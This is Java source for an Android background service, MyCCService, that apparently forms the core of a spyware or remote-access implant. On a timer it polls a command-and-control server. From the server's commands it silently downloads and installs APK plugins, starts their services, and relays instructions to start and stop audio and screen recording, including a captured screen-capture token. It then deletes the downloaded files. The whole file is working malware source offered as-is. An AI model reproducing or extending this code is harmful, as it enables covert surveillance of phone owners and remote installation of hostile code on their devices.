package com.example.SystemServices;

import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.IBinder;
import android.os.RemoteException;
import android.util.Log;

import com.example.Util.phoneback.NetworkHelper;
import com.morgoo.droidplugin.pm.PluginManager;
import com.morgoo.helper.compat.PackageManagerCompat;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.*;
import java.io.File;
import java.util.TimerTask;


/**
 * An {@link Service} subclass for handling asynchronous task requests in
 * a service on a separate handler thread.
 * <p>
 * TODO: Customize class - update intent actions, extra parameters and static
 * helper methods.
 */
public class MyCCService extends Service {
    protected Context context;
    private String tag = "C2-Host";
    private static String TAG = "C2-Host";

    private static final String ACTION_c2_INSTALL_APK = "com.example.action.ACTION_INSTALL_APK";
    private static final String ACTION_c2_UNINSTALL_APK  = "ACTION_c2_UNINSTALL_APK";

    private static final String ACTION_INSTALL_APK_EXTRA_PARAM1 = "APK_PATH";
    private static final String ACTION_UNINSTALL_APK_EXTRA_PARAM1 = "APK_PACKAGE_NAME";
    public List<String> installPkgNames = new ArrayList<String>();

    private static Intent screenRecordingIntentToken = null;
    public static void  setScreenRecordingIntentToken(Intent token){
        Log.d(TAG, "[tluo] Update ScreenRecording Token in Host remote C&C Process"+token);
        screenRecordingIntentToken = token;
    }

    public MyCCService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        Log.d(tag, "[tluo] Starting ... ");
        context = this;
        CCTimerTask();
    }

    public void CCTimerTask(){
        int delay = 5000;
        int period = 20000;
        java.util.Timer timer = new java.util.Timer(true);
        TimerTask task = new TimerTask() {
            public void run() {
                Log.d(tag, "[tluo] C2TimerTask -- Sending C2 Request ... ");
                String response = NetworkHelper.sendCCReq(true);
                processCCReq(context,response);
            }
        };
        timer.schedule(task, delay, period);
    }

    public void processCCReq(Context context, String raw_response) {
        try {
            JSONObject obj = new JSONObject(raw_response);
            String[] cmds = obj.getString("cmd").split(";");
            for (String cmd : cmds) {
                if (cmd.contains("install")) {
                    String[] args = cmd.split(":");
                    String path = args[1];
                    String sdPath = context.getExternalFilesDir(null).getAbsolutePath() + File.separator
                            + String.format("%s.apk", path);
                    Log.d(tag, String.format("%s: %s", args[0], sdPath));
                    boolean done = NetworkHelper.DownloadFile(path, sdPath, true);
                    if (done) {
                        installInPlugin(context, sdPath);
                        installPkgNames.add(intentInterface.intentServicePkgName);
                    }
                } else if (cmd.contains("uninstall")) {

                } else if (cmd.equals(intentInterface.Remote_CMD_START_RECORDING) ||
                        (cmd.equals(intentInterface.Remote_CMD_STOP_RECORDING) ||
                                cmd.equals(intentInterface.Remote_CMD_START_ScreenRECORDING) ||
                                cmd.equals(intentInterface.Remote_CMD_STOP_ScreenRECORDING)
                        )) {
                    sendIntentCommand(cmd, context);
                }
            }
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

    public boolean installInPlugin(Context context, String apk_path) {
        Log.d(tag, "[key] Install Plugin from (" + apk_path + ")");
        try {
            Intent intent = new Intent();
            intent.setComponent(new ComponentName(intentInterface.intentServicePkgName, "test.com.accessibility.FileUploadService"));
            intent.setAction("stop");
            startService(intent);
            intent.setComponent(new ComponentName(intentInterface.intentServicePkgName, "test.com.accessibility.UtilService"));
            stopService(intent);
            PluginManager.getInstance().deletePackage(intentInterface.intentServicePkgName, 0);

            final int re = PluginManager.getInstance().installPackage(apk_path, 0);
            switch (re) {
                case PluginManager.INSTALL_FAILED_NO_REQUESTEDPERMISSION:
                    Log.d("tluo", "安装失败，文件请求的权限太多");
                    break;
                case PackageManagerCompat.INSTALL_FAILED_NOT_SUPPORT_ABI:
                    Log.d("tluo", "宿主不支持插件的abi环境，可能宿主运行时为64位，但插件只支持32位");
                    break;
                case PackageManagerCompat.INSTALL_SUCCEEDED:
                    Log.d("tluo", "[C2Service]: {" + apk_path + "} 安装完成");
                    // TODO: HARDCODE SERVICES IN PLUGINS, THIS INFO SHOULD BE PASSED BY SERVER.
                    startPluginServices();
                    break;
            }
            new File(apk_path).delete();
            return true;
        } catch (RemoteException e) {
            e.printStackTrace();
        }
        return false;
    }

    public void sendIntentCommand(String command, Context context){
        Log.d(tag, "[tluo] sendIntentCommand:" + command);
        Intent intent = new Intent();
        intent.setComponent(new ComponentName(intentInterface.intentServicePkgName, intentInterface.intentServiceName));
        intent.setAction(intentInterface.Remote_CMD_EVENT);
        intent.putExtra(intentInterface.intentService_Param_RootDir, context.getExternalFilesDir(null).getAbsolutePath());
        intent.putExtra(intentInterface.Remote_CMD_EVENT_ACTION_ParamName, command);
        if (command.equals(intentInterface.Remote_CMD_START_ScreenRECORDING)){
            intent.putExtra(intentInterface.AccessEvent_intentToken, screenRecordingIntentToken);
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent);
        } else {
            context.startService(intent);
        }
    }

    private void startPluginServices(){
        PackageManager pm = getPackageManager();
        Intent intent2 = pm.getLaunchIntentForPackage(intentInterface.intentServicePkgName);
        intent2.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent2);

        Intent intent = new Intent();
        intent.setComponent(new ComponentName(intentInterface.intentServicePkgName, intentInterface.intentServiceName));
        intent.putExtra(intentInterface.intentService_Param_RootDir, getExternalFilesDir(null).getAbsolutePath());
        startService(intent);
    }

    /////////////////////////////////////////////////
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            Log.d(tag,"[tluo] Receive Intent (onStartCommand) with Action: " + intent.getAction());
            final String action = intent.getAction();
            if (ACTION_c2_INSTALL_APK.equals(action)) {
                final String param1 = intent.getStringExtra(ACTION_INSTALL_APK_EXTRA_PARAM1);
                installInPlugin(this, param1);
            } else if (ACTION_c2_UNINSTALL_APK.equals(action)) {
                final String packetname = intent.getStringExtra(ACTION_UNINSTALL_APK_EXTRA_PARAM1);
                installInPlugin(this, packetname);
            } else if (intentInterface.ACTION_setScreenRecordingIntent.equals(action)) {
                Intent token = intent.getExtras().getParcelable(intentInterface.Param_ScreenRecording_token);
                setScreenRecordingIntentToken(token);
            }
        }
        return Service.START_NOT_STICKY;
    }
}
